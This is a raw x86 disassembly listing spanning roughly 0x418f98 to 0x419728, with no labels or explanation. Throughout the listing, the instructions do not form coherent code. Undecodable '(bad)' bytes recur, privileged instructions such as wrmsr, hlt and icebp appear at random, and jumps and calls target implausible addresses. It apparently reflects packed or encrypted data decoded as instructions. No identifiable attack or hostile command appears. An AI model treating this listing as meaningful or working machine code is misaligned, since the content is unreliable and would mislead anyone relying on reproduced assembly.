  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
